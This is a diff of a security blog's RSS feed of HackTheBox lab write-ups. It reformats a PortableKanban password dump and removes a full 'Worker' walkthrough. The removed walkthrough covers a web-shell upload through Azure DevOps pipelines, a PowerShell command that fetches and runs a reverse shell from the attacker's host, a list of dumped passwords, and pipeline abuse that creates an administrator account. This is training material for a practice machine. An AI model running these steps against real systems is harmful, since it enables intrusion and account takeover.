-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json"><span style="color:#960050;background-color:#1e0010">GET</span> <span style="color:#960050;background-color:#1e0010">pk:urn:user:e</span><span style="color:#ae81ff">8e29158</span><span style="color:#960050;background-color:#1e0010">-d</span><span style="color:#ae81ff">70</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#ae81ff">-44</span><span style="color:#960050;background-color:#1e0010">b</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">-a</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">ba</span><span style="color:#ae81ff">-4949</span><span style="color:#960050;background-color:#1e0010">d</span><span style="color:#ae81ff">52790</span><span style="color:#960050;background-color:#1e0010">a</span><span style="color:#ae81ff">0</span>
-<span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">207</span>
-{<span style="color:#f92672">&#34;Id&#34;</span>:<span style="color:#e6db74">&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;</span>,<span style="color:#f92672">&#34;Name&#34;</span>:<span style="color:#e6db74">&#34;Administrator&#34;</span>,<span style="color:#f92672">&#34;Initials&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;Email&#34;</span>:<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#f92672">&#34;EncryptedPassword&#34;</span>:<span style="color:#e6db74">&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;</span>,<span style="color:#f92672">&#34;Role&#34;</span>:<span style="color:#e6db74">&#34;Admin&#34;</span>,<span style="color:#f92672">&#34;Inactive&#34;</span>:<span style="color:#66d9ef">false</span>,<span style="color:#f92672">&#34;TimeStamp&#34;</span>:<span style="color:#ae81ff">637530169606440253</span>}
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
+$207
+{&#34;Id&#34;:&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;,&#34;Name&#34;:&#34;Administrator&#34;,&#34;Initials&#34;:&#34;&#34;,&#34;Email&#34;:&#34;&#34;,&#34;EncryptedPassword&#34;:&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;,&#34;Role&#34;:&#34;Admin&#34;,&#34;Inactive&#34;:false,&#34;TimeStamp&#34;:637530169606440253}
 </code></pre></div><h4 id="portablekanban-decrypt">PortableKanban Decrypt</h4>
 <p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href="https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py">script</a>  (a modified version of the original exploit).</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">from base64 import b64decode
@@ -1531,400 +1810,6 @@ $ evil-winrm -i 10.10.10.192 -u administrator -H <span style="color:#e6db74">&#3
 </li>
 </ol>
 </section>
-]]></content:encoded>
-    </item>
-    
-    <item>
-      <title>HackTheBox - Worker</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</link>
-      <pubDate>Mon, 03 May 2021 17:01:02 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-worker/</guid>
-      <description>Learn how Azure Pipelines can be exploited</description>
-      <content:encoded><![CDATA[<p>Worker is a medium difficulty Windows machine that features a self-hosted Apache Subversion and Azure DevOps server. Enumerating the Subversion server discovers a set of credentials and a subdomain at which the Azure DevOps is hosted. The credentials can be used to login into Azure DevOps server, which then leveraged to gain a foothold on the box by dropping a web shell. Enumeration inside the box finds another set of credentials that also can be used to login into the Azure DevOps. Using the second credentials I obtained, I&rsquo;m able to gain administrator access by exploiting Azure Pipeline.</p>
-<h3 id="skills-learned">Skills Learned</h3>
-<ul>
-<li>SVN enumeration</li>
-<li>Windows enumeration</li>
-<li>Exploiting Azure Pipelines</li>
-</ul>
-<h3 id="tools">Tools</h3>
-<ul>
-<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
-<li>Nmap - Preinstalled in Kali Linux</li>
-<li>svn cli client - Preinstalled in Kali Linux</li>
-<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>An initial TCP scan with <code>nmap</code> discovers two open ports: 80 (HTTP) and 3690 (Subversion)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19» 
-$ nmap -sC -sV -oN worker-initial -v 10.10.10.203
-<span style="color:#75715e"># Nmap 7.80 scan initiated Sun Aug 16 11:35:56 2020 as: nmap -sC -sV -oN worker-initial -v 10.10.10.203</span>
-Nmap scan report <span style="color:#66d9ef">for</span> dimension.worker.htb <span style="color:#f92672">(</span>10.10.10.203<span style="color:#f92672">)</span>
-Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
-
-PORT     STATE SERVICE  VERSION
-80/tcp   open  http     Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Service Unavailable
-3690/tcp open  svnserve Subversion
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-</code></pre></div><p>Performing another scan on typical Active Directory DC ports shows only WinRM (5985) is open.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
-$ nmap -p53,445,389,5985 10.10.10.203
-Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-01-31 13:34 EST
-Host is up <span style="color:#f92672">(</span>0.013s latency<span style="color:#f92672">)</span>.
-
-PORT     STATE     SERVICE
-<span style="color:#ae81ff">53</span>       filtered  domain
-<span style="color:#ae81ff">389</span>      filtered  ldap
-<span style="color:#ae81ff">445</span>      filtered  microsoft-ds
-<span style="color:#ae81ff">5985</span>     open      wsman
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-80---website">TCP 80 - Website</h3>
-<p>Visiting the port 80 displays the IIS default page.</p>
-<p><img class="img-container" src="imgs/image-20210503174900610.png" alt="image-20210503174900610"  />
-</p>
-<h3 id="tcp-3690---subversionsvn">TCP 3690 - Subversion/SVN</h3>
-<p>This is my first encounter with Subversion, it is a software for version control that is similar to git. To interact with this service, I&rsquo;ll need the Subversion client. Fortunately, it was preinstalled in Kali Linux.</p>
-<p>The general usage as follows:</p>
-<pre><code>svn &lt;sub-command&gt; svn://[ip]
-</code></pre><ul>
-<li>Example of subcommand: <code>ls</code>, <code>cat</code>, <code>info</code>, <code>log</code>.</li>
-</ul>
-<p>With the subcommand <code>ls</code>, I can list the repository contents.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
-$ svn ls svn://10.10.10.203
-dimension.worker.htb/
-moved.txt
-</code></pre></div><p><code>moved.txt</code> tells that the repository is no longer maintained. The latest repo is available at <code>http://devops.worker.htb</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
-$ svn cat svn://10.10.10.203/moved.txt
-This repository has been migrated and will no longer be maintaned here.
-You can find the latest version at: http://devops.worker.htb
-
-// The Worker team :<span style="color:#f92672">)</span>
-</code></pre></div><p>With the subcommand <code>info</code>, I find the author of the repository. It also reveals that the repository has 5 revisions (commit).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
-$ svn info svn://10.10.10.203
-Path: .
-URL: svn://10.10.10.203
-Relative URL: ^/
-Repository Root: svn://10.10.10.203
-Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
-Revision: <span style="color:#ae81ff">5</span>
-Node Kind: directory
-Last Changed Author: nathen
-Last Changed Rev: <span style="color:#ae81ff">5</span>
-Last Changed Date: 2020-06-20 09:52:00 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span>
-</code></pre></div><p>I can check the revision log using the sub command <code>log</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
-$ svn log svn://10.10.10.203
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-r5 | nathen | 2020–06–20 09:52:00 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
-Added note that repo has been migrated
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-r4 | nathen | 2020–06–20 09:50:20 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
-Moving this repo to our new devops server which will handle the deployment <span style="color:#66d9ef">for</span> us
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-r3 | nathen | 2020–06–20 09:46:19 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
--
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-r2 | nathen | 2020–06–20 09:45:16 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
-Added deployment script
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-r1 | nathen | 2020–06–20 09:43:43 -0400 <span style="color:#f92672">(</span>Sat, <span style="color:#ae81ff">20</span> Jun 2020<span style="color:#f92672">)</span> | <span style="color:#ae81ff">1</span> line
-First version
-- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
-</code></pre></div><p>The commit message on <code>r2</code> seems interesting.</p>
-<p>I can check the differences between <code>r1</code> and <code>r2</code> using the subcommand <code>diff</code>. The output shows there is a hard-coded credentials.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «192.168.2.103»
-$ svn diff -r 1:2 svn://10.10.10.203/
-</code></pre></div><p><img class="img-container" src="imgs/image-20210503175056134.png" alt="image-20210503175056134"  />
-</p>
-<p>From here, I&rsquo;ll take note about what I&rsquo;ve found here.</p>
-<ul>
-<li>Two subdomains: <code>dimension.worker.htb</code> and <code>devops.worker.htb</code></li>
-<li>A set of credentials: <code>nathen:wendel98</code></li>
-</ul>
-<p>I&rsquo;ll add those two subdomains to my <code>/etc/hosts</code> file.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.203 dimension.worker.htb devops.worker.htb
-</code></pre></div><p>Then after I make sure there is nothing left, I&rsquo;ll revisit port 80 with the newly discovered subdomain.</p>
-<h3 id="tcp-80---dimensionworkerhtb">TCP 80 - dimension.worker.htb</h3>
-<p>Visiting <code>dimension.worker.htb</code> presented with a static page.</p>
-<p><img class="img-container" src="imgs/image-20210503175111010.png" alt="image-20210503175111010"  />
-</p>
-<p>It even leads to others static site (with subdomain) which I think they are just decoy.</p>
-<p><img class="img-container" src="imgs/image-20210503175127918.png" alt="image-20210503175127918"  />
-</p>
-<p>Before moving on, I&rsquo;ll add all the subdomains I found on <code>/#work</code> to my <code>/etc/hosts</code>. They are:</p>
-<ul>
-<li><code>alpha.worker.htb</code></li>
-<li><code>cartoon.worker.htb</code></li>
-<li><code>lens.worker.htb</code></li>
-<li><code>solid-state.worker.htb</code></li>
-<li><code>spectral.worker.htb</code></li>
-<li><code>story.worker.htb</code></li>
-</ul>
-<p>Now I&rsquo;ll jump over to the mentioned new DevOps server at <code>http://devops.worker.htb</code>.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-iis-appool">Shell as IIS appool</h3>
-<h4 id="azure-devops---smarthotel360">Azure DevOps - SmartHotel360</h4>
-<p>Visiting <code>http://devops.worker.htb</code> pops an authentication prompt. It logs me in after I entered the credentials I obtained from SVN, and the user, <code>nathen</code>, is currently working on a project called &ldquo;SmartHotel360&rdquo;.</p>
-<p><img class="img-container" src="imgs/image-20210503175154637.png" alt="image-20210503175154637"  />
-</p>
-<p>My first objective is to find out what permission do this user have. I clicked the project and try to lookup into the Project Settings.</p>
-<p><img class="img-container" src="imgs/image-20210503175211414.png" alt="image-20210503175211414"  />
-</p>
-<p>User permission or group related settings are found to be under the Security menu (Project Settings -&gt; Security Settings).</p>
-<p>It seems user <code>nathen</code> is the only member of the SmartHotel360 Team.</p>
-<p><img class="img-container" src="imgs/image-20210503175233456.png" alt="image-20210503175233456"  />
-</p>
-<p>And the SmartHotel360 team is a member of Contributors group and Projects Valid Users, and this is added by default upon creating a team group.</p>
-<p><img class="img-container" src="imgs/image-20210503175249455.png" alt="image-20210503175249455"  />
-</p>
-<p>The Contributors group and Projects Valid Users group permissions are defined <a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">here</a>, and user <code>nathen</code> inherits those two groups' permission.</p>
-<p><img class="img-container" src="imgs/image-20210503230648404.png" alt="image-20210503230648404"  />
-</p>
-<p>From there, I try to lookup into the project&rsquo;s repository.</p>
-<p>I find a bunch of website repositories on the Repos menu. These repositories are previously listed on <code>http://dimension.worker.htb/#work</code> page. User <code>nathen</code> is the author of these repositories.</p>
-<p><img class="img-container" src="imgs/image-20210503175346216.png" alt="image-20210503175346216"  />
-</p>
-<p>On the Pipelines menu, there are Azure Pipelines for some of the sites. Azure Pipelines is CICD feature from Azure DevOps. It is similar to GitHub Action that I use to rebuild this static site using Hugo when there is a new commit pushed into the main/master branch.</p>
-<blockquote>
-<p>My video recommendation about CICD: <a href="https://www.youtube.com/watch?v=scEDHsr3APg">https://www.youtube.com/watch?v=scEDHsr3APg</a></p>
-</blockquote>
-<p><img class="img-container" src="imgs/image-20210503175356998.png" alt="image-20210503175356998"  />
-</p>
-<p>User <code>nathen</code> is allowed to queue a builds.</p>
-<p><img class="img-container" src="imgs/image-20210503175409857.png" alt="image-20210503175409857"  />
-</p>
-<p>With all of these permission, I can make changes such as dropping a web shell to one of the site repositories that has its own pipeline, say the alpha repository which has Alpha-CI, then I can queue those changes to the pipelines and wait until the site re-deployed/hosted. From there, I should be able to access my web-shell.</p>
-<h4 id="webshell-upload">Webshell Upload</h4>
-<p>On my first attempt, it tells me to use pull requests instead of uploading a file directly to the master branch.</p>
-<p>So, I&rsquo;ll upload my web shell which is <code>cmdasp.aspx</code> (because the web server is IIS) on a new branch. I’ll be using the alpha repository.</p>
-<p><img class="img-container" src="imgs/image-20210503175435088.png" alt="image-20210503175435088"  />
-</p>
-<p>I&rsquo;ll pick any available work items.</p>
-<p><img class="img-container" src="imgs/image-20210503175452577.png" alt="image-20210503175452577"  />
-</p>
-<p>I can just drag and drop the web shell, and commit it afterwards.</p>
-<p><img class="img-container" src="imgs/image-20210503175506892.png" alt="image-20210503175506892"  />
-</p>
-<p>From here, I can create a pull request to the master branch to trigger the pipelines or run the Alpha-CI build manually.</p>
-<p>If I choose a pull request, it needs to be reviewed first and the reviewer is the user <code>nathen</code> itself, it can decide whether to approve or reject the pull request (well, actually it was me who decide it). It then queue the build.</p>
-<p><img class="img-container" src="imgs/image-20210503175518917.png" alt="image-20210503175518917"  />
-</p>
-<p>The other options is with this queue builds. I can skip the review and run the queue builds for my branch (on the image it is shell branch instead of iamf).</p>
-<p><img class="img-container" src="imgs/image-20210503175531792.png" alt="image-20210503175531792"  />
-</p>
-<p>After the build finished, I can see my web shell is available at <code>alpha.worker.htb/cmdasp.aspx</code>.</p>
-<p><img class="img-container" src="imgs/image-20210503175541314.png" alt="image-20210503175541314"  />
-</p>
-<p>To gain an interactive shell, I&rsquo;ll setup a <code>netcat</code> listener on my Kali, then I&rsquo;ll upload a <a href="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3">PowerShell reverse shell</a> called <code>itsf.ps1</code> and execute it via the web shell.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">powershell.exe <span style="color:#e6db74">&#34;mkdir c:/temp;invoke-webrequest -uri 10.10.14.19/itsf.ps1 -outfile C:\temp\itsf.ps1;C:\temp\itsf.ps1&#34;</span>
-</code></pre></div><p>I have a shell now on my listener.</p>
-<p><img class="img-container" src="imgs/image-20210503175604917.png" alt="image-20210503175604917"  />
-</p>
-<h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-robisl">Shell as robisl</h3>
-<h4 id="internal-enumeration">Internal Enumeration</h4>
-<p>Enumerating the user groups and privileges using the <code>whoami /all</code> command reveals that IIS appool has <code>SeImpersonatePrivilege</code> which according to <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">BookHackTrick</a>, it can be abused using RogueWinRM.</p>
-<p><img class="img-container" src="imgs/image-20210503175615273.png" alt="image-20210503175615273"  />
-</p>
-<p>Unfortunately, the WinRM port was already open, I couldn’t exploit it with RogueWinRM. But, I managed to find another way!</p>
-<p>Enumerating the Users folder finds two users, <code>robisl</code> and <code>restorer</code> (as the name implies, it restore the box configuration, I&rsquo;ll ignore this).</p>
-<p><img class="img-container" src="imgs/image-20210503175630874.png" alt="image-20210503175630874"  />
-</p>
-<p>By using the <code>net</code> command, it shows that <code>robisl</code> can login remotely.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PS C:\Users&gt; net user robisl
-User name                    robisl
-Full Name                    Robin Islip
-Comment                      
-User’s comment               
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
-
-Password last set            2020-04-05 21:27:26
-Password expires             Never
-Password changeable          2020-04-05 21:27:26
-Password required            No
-User may change password     No
-
-Workstations allowed         All
-Logon script                 
-User profile                 
-Home directory               
-Last logon                   2020-08-18 18:28:36
-
-Logon hours allowed          All
-
-Local Group Memberships      *Production           *Remote 
-Global Group memberships     *None                 
-The command completed successfully.
-</code></pre></div><p>With <code>net</code> command, I also find there is another drive mounted as <code>W:\</code></p>
-<pre><code>PS C:\users\&gt;net share
-
-Share name   Resource                        Remark
-
--------------------------------------------------------------------------------
-C$           C:\                             Default share
-IPC$                                         Remote IPC
-W$           W:\                             Default share
-ADMIN$       C:\Windows                      Remote Admin
-The command completed successfully.
-</code></pre><p>There are 4 folders in the <code>W:\</code> drive, the one that interesting is the svnrepos folder.</p>
-<pre><code>PS W:\&gt; dir
-
-
-    Directory: W:\
-
-
-Mode                LastWriteTime         Length Name                                                             
-----                -------------         ------ ----                                                             
-d-----       2020-06-16     18:59                agents                                                          
-d-----       2020-03-28     15:57                AzureDevOpsData                                                
-d-----       2020-04-03     11:31                sites                                                          
-d-----       2020-06-20     16:04                svnrepos
-</code></pre><p>I can enumerate all folder and sub folder on the <code>W:\</code> drive recursively using the <code>dir</code> command. Because I&rsquo;m on PowerShell, I have to use <code>cmd /c &lt;command&gt;</code> keyword.</p>
-<pre><code>PS W:\&gt; cmd.exe /c &quot;dir /s /b svnrepos&quot;
-</code></pre><p>Well PowerShell can do that too, but I prefer <code>cmd</code>.</p>
-<pre><code>PS W:\&gt; Get-ChildItem -Path W:\svnrepos -Filter * -Recurse -ErrorAction SilentlyContinue -Force
-</code></pre><p>In the output, there is a <code>passwd</code> file that immediately draws my attention</p>
-<p><img class="img-container" src="imgs/image-20210504232344047.png" alt="image-20210504232344047"  />
-</p>
-<p>The <code>passwd</code> file contains a bunch of credentials, and my eyes caught the password for <code>robisl</code>.</p>
-<pre><code>PS W:\svnrepos\&gt; gc .\www\conf\passwd
-### This file is an example password file for svnserve.
-### Its format is similar to that of svnserve.conf. As shown in the
-### example below it contains one section labelled [users].
-### The name and password for each user follow, one account per line.
-
-[users]
-nathen = wendel98
-nichin = fqerfqerf
-nichin = asifhiefh
-noahip = player
-nuahip = wkjdnw
-oakhol = bxwdjhcue
-owehol = supersecret
-paihol = painfulcode
-parhol = gitcommit
-pathop = iliketomoveit
-pauhor = nowayjose
-payhos = icanjive
-perhou = elvisisalive
-peyhou = ineedvacation
-phihou = pokemon
-quehub = pickme
-quihud = kindasecure
-rachul = guesswho
-raehun = idontknow
-ramhun = thisis
-ranhut = getting
-rebhyd = rediculous
-reeinc = iagree
-reeing = tosomepoint
-reiing = isthisenough
-renipr = dummy
-rhiire = users
-riairv = canyou
-ricisa = seewhich
-robish = onesare
-robisl = wolves11
-robive = andwhich
-ronkay = onesare
-rubkei = the
-rupkel = sheeps
-ryakel = imtired
-sabken = drjones
-samken = aqua
-sapket = hamburger
-sarkil = friday
-</code></pre><h4 id="remote-access---robisl">Remote Access - robisl</h4>
-<p>I can login remotely using <code>robisl</code> credentials with <code>evil-winrm</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «worker» «10.10.14.19»
-$ evil-winrm -i 10.10.10.203 -u robisl -p wolves11
-
-Evil-WinRM shell v2.3
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
-worker<span style="color:#ae81ff">\r</span>obisl
-*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>ocuments&gt; cd ../Desktop
-*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>esktop&gt; dir
-
-
-    Directory: C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obisl<span style="color:#ae81ff">\D</span>esktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---        1/29/2020   3:37 PM             <span style="color:#ae81ff">34</span> user.txt
-</code></pre></div><h3 id="shell-as-administrator">Shell as administrator</h3>
-<h4 id="azure-devops---partsunlimited">Azure DevOps - PartsUnlimited</h4>
-<p>After enumerating many things in the remote shell and coming up empty-handed, I returned to Azure DevOps, but this time with a <code>robisl</code> account.</p>
-<p><img class="img-container" src="imgs/image-20210503175744995.png" alt="image-20210503175744995"  />
-</p>
-<p>Long short story, <code>robisl </code> is member of Build Administrator.</p>
-<p><img class="img-container" src="imgs/image-20210503175756504.png" alt="image-20210503175756504"  />
-</p>
-<p>The Build Administrators defined as follows [<a href="https://docs.microsoft.com/en-us/azure/devops/organizations/security/permissions?view=azure-devops&amp;tabs=preview-page">source</a>].</p>
-<p><img class="img-container" src="imgs/image-20210504010111041.png" alt=""  />
-</p>
-<h4 id="exploit-azure-pipelines---read-the-root-flag">Exploit Azure Pipelines - Read the Root Flag</h4>
-<p>So the plan is, I’ll create an Azure pipelines with malicious deployment script/task to execute OS commands.</p>
-<p><img class="img-container" src="imgs/image-20210503175809136.png" alt="image-20210503175809136"  />
-</p>
-<p>If I lookup into the agent pool in the Project Settings menu, there is an available agent named ‘Setup’. The agent is owned by an Administrator account, and as a Build Administrator member (inherited), user <code>robisl</code> also has access to it.</p>
-<p><img class="img-container" src="imgs/image-20210503175820811.png" alt="image-20210503175820811"  />
-</p>
-<p>So, let’s execute the plan!</p>
-<p>First, I’ll create a pipeline (Pipelines -&gt; Builds -&gt;  New Pipeline).</p>
-<p><img class="img-container" src="imgs/image-20210503175837201.png" alt="image-20210503175837201"  />
-</p>
-<p>In the next section, I’ll choose Azure Repos Git.</p>
-<p><img class="img-container" src="imgs/image-20210503175848517.png" alt="image-20210503175848517"  />
-</p>
-<p>On the next one, I’ll select &ldquo;PartsUnlimited&rdquo; as the repository, because that is the repo where <code>robisl</code> is working on.</p>
-<p><img class="img-container" src="imgs/image-20210503175906165.png" alt="image-20210503175906165"  />
-</p>
-<p>In the Configure section, scroll down and select the starter pipeline (I forgot the name, but don&rsquo;t choose the existing one). After that, I’ll modify the pool and the script in the &ldquo;Review&rdquo; section to steal the flag.</p>
-<p><img class="img-container" src="imgs/image-20210503175920007.png" alt="image-20210503175920007"  />
-</p>
-<p>The master branch will be the <code>trigger</code> to run the CI\CD (If I push a changes to the &ldquo;PartsUnlimited&rdquo; repository). Since I have access to the &ldquo;Setup&rdquo; pool, I&rsquo;ll use it as the <code>pool</code>. Lastly, on the <code>steps</code> you can add a task/script you want to run/do. In my case, I want to read the root flag.</p>
-<p>I’ll save it and run it on a new branch.</p>
-<p><img class="img-container" src="imgs/image-20210503175931307.png" alt="image-20210503175931307"  />
-</p>
-<p>I’ll just wait for the output log.</p>
-<p><img class="img-container" src="imgs/image-20210503175944023.png" alt="image-20210503175944023"  />
-</p>
-<p>Once it completed, I can see the root flag inside the &ldquo;Steal the flag&rdquo; output</p>
-<p><img class="img-container" src="imgs/image-20210503175957351.png" alt="image-20210503175957351"  />
-</p>
-<h4 id="create-user-with-administrator-privileges">Create User with Administrator Privileges</h4>
-<p>I can also create a privileged user using multi-line script.</p>
-<pre><code>- script: | 
-net user iamf YourComplexPassword /add /domain
-net localgroup Administrators iamf /add 
-net localgroup &quot;Remote Management Users&quot; iamf /add 
-displayName: &quot;Set IamF to Admin&quot;
-</code></pre><p>I can push it again and wait for it to complete.</p>
-<p><img class="img-container" src="imgs/image-20210503180039057.png" alt="image-20210503180039057"  />
-</p>
-<p>Now I can login with the newly created user.</p>
-<p><img class="img-container" src="imgs/image-20210503180028754.png" alt="image-20210503180028754"  />
-</p>
-<hr>
-<p>References:</p>
-<ul>
-<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops">https://docs.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops</a></li>
-<li><a href="https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/">https://adamtheautomator.com/powershell-scripts-azure-devops-pipelines/</a></li>
-<li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers">https://docs.microsoft.com/en-us/azure/devops/pipelines/repos/azure-repos-git?view=azure-devops&amp;tabs=yaml#ci-triggers</a></li>
-</ul>
 ]]></content:encoded>
     </item>
     
